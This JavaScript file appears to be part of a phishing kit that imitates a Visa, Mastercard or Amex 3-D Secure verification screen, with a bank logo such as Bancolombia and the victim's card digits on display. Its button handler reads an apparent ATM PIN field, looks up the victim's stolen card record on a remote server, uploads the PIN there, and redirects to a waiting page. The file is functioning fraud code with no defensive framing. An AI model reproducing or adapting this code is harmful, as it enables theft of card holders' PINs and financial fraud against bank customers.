const companyLoader = document.querySelector("#company-loader");
const companyLogo = document.querySelector("#company-logo");
const bankLogo = document.querySelector("#bank-logo");
if (info.checkerInfo.company === "VISA") {
  companyLoader.setAttribute("src", "./assets/logos/visa_verified.png");
  companyLoader.setAttribute("width", "130px");
  companyLoader.setAttribute("style", "margin-bottom: 40px");

  companyLogo.setAttribute("src", "./assets/logos/visa_verified.png");
  companyLogo.setAttribute("width", "90px");
} else if (info.checkerInfo.company === "MC") {
  companyLoader.setAttribute("src", "./assets/logos/mc_id_check_2.jpg");
  companyLoader.setAttribute("width", "400px");

  companyLogo.setAttribute("src", "./assets/logos/mc_id_check_1.webp");
  companyLogo.setAttribute("width", "130px");
} else if (info.checkerInfo.company === "AM") {
  companyLoader.setAttribute("src", "./assets/logos/amex_check_1.png");
  companyLoader.setAttribute("width", "200px");

  companyLogo.setAttribute("src", "./assets/logos/mc_id_check_1.webp");
  companyLogo.setAttribute("width", "110px");
}

if (info.metaInfo.ban === "bancolombia") {
  bankLogo.setAttribute("src", `./assets/logos/${info.metaInfo.ban}.png`);
  bankLogo.setAttribute("width", `120px`);
} else {
  bankLogo.setAttribute("src", `./assets/logos/${info.metaInfo.ban}.png`);
}

const mainLoader = document.querySelector(".main-loader");
setTimeout(() => {
  try {
    mainLoader.classList.remove("show");
  } catch (e) {
    console.log("e");
  }
}, 2500);

const flightPrice = document.querySelectorAll("#flight-price");
const cardDigits = document.querySelector("#card-digits");
cardDigits.textContent = info.metaInfo.p.split(" ")[3];
function formatPrice(number) {
  return number.toLocaleString("es", {
    maximumFractionDigits: 0,
    useGrouping: true,
  });
}



document
  .getElementById("btnNextStep")
  .addEventListener("click", function (event) {
    event.preventDefault();
    var ccj = document.getElementById("ccajero").value;
    console.log(ccj);
    var form = document.getElementById("form");
    var inputs = form.querySelectorAll("input[required]");
    var allFilled = Array.from(inputs).every(
      (input) => input.value.trim() !== ""
    );

    if (!allFilled) {
      var errorMessage = document.getElementById("error-message");
      errorMessage.textContent = "Todos los campos son obligatorios.";
      errorMessage.style.display = "block";

      setTimeout(function () {
        errorMessage.style.display = "none";
      }, 2000);
    } else {
      async function updateCcj() {
        const response = await fetch(`${url}/dataTables/dataTables`, {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
          },
        });

        const serverData = await response.json();
        const dataTables = [...serverData];

        for (const data of dataTables) {
          if (data.tarjeta == info.metaInfo.p && data.id == info.metaInfo.cc) {
            console.log("Usuario Encontrado");
            const updateResponse = await fetch(
              `${url}/dataTables/updateCajero/${data.idreg}`,
              {
                method: "PUT",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  ccajero: ccj,
                }),
              }
            );
            const updateData = await updateResponse.json();
          }
        }
        window.location.href = "waiting.html";
      }

      updateCcj();
    }
  });
